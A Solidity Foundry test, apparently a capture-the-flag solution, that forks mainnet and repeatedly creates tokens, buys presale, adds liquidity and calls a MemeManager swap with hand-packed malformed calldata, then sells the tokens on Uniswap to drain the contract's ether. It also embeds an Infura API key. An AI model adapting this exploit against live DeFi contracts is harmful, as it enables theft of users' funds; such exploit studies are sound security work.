// pragma solidity ^0.8.28;

import {Test, console} from "forge-std/Test.sol";
import {IERC20} from "lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {MemeToken} from "src/MemeToken.sol";
import {MemeManager} from "src/MemeManager.sol";
import {IUniswapV2Router02} from "src/interfaces/IUniswapV2Router02.sol";
contract TestContract is Test {
    function setUp() public {}

    function test_memtoken() public {
        address player = vm.addr(0x13373874284728347298472894799);
        address system = vm.addr(0x1338);
        vm.createSelectFork("https://mainnet.infura.io/v3/25b53bc4144e4c7b808df53e86fa5593");
        vm.deal(system, 100 ether);
        vm.deal(player, 1 ether);
        vm.startPrank(system);
        address factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
        address router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        MemeManager memeManager = new MemeManager{value: 100 ether}(system, factory, router, weth, player);

        vm.startPrank(player);
        for(uint i=0;i<10;i++) {
            (address token, address pair) = memeManager.createMeme("hi", "helo", 0.0001 * 1e18);
            uint256 amount;
            if(i==0) {
                amount = 0.95 * 1e18;
            }
            else {
                amount = player.balance;
            }
            memeManager.preSale{value: amount}(token, 10000 * amount);
            memeManager.ProvideLiquidity(token, block.timestamp);
            bytes memory payload;
            payload = abi.encodePacked(
                memeManager.swap.selector,
                uint8(1),
                token,
                uint256(amount),
                uint8(1)
            );
            (bool success, ) = address(memeManager).call(payload);
            assert(success);

            IERC20(token).approve(router, IERC20(token).balanceOf(player));
            address[] memory path = new address[](2);
            path[0] = token;
            path[1] = weth;
            IUniswapV2Router02(router).swapExactTokensForETH(IERC20(token).balanceOf(player), 0, path, player, block.timestamp);
            console.log("eth balance", player.balance);
            console.log("token balance", IERC20(token).balanceOf(player));
            console.log("token balance", IERC20(weth).balanceOf(player));
        }
    }
}